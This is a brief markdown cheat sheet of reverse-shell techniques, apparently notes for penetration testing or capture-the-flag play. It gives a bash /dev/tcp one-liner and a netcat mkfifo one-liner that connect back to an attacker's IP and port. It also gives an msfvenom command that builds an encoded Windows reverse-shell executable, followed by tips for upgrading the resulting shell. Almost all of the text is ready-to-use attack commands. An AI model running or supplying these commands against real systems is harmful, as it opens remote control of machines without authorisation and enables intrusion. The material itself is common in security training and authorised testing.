# Reverse Shell

## One-Liners

#### Bash

```bash
bash -i >& /dev/tcp/<IP>/<port> 0>&1
```

#### Netcat

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <port> >/tmp/f
```

Sometimes one one-liner won't work, but another will. Two great cheatsheets are [pentestmonkey ](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)and [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

## Generate Payload

### Msfvenom

#### Windows reverse shell with encoder

```text
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=<Your IP> LPORT=<Listening Port> -f exe -o <Shell Name>.exe
```

## Shell Cushions

If the reverse shell is terminal-based some measures can be taken to make it more comfortable to use.

### Spawn TTY

#### Python

```text
python -c ‘import pty;pty.spawn(“/bin/bash”)’
```

[Additional](https://netsec.ws/?p=337) ways to spawn TTY.

### Auto-Completion

Background the process with Ctrl+z.

Execute this to disable echoing and send I/O straight through without processing.

```text
stty raw -echo
```

return to the process with fg + Enter x2.

[Additional cushions](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2).



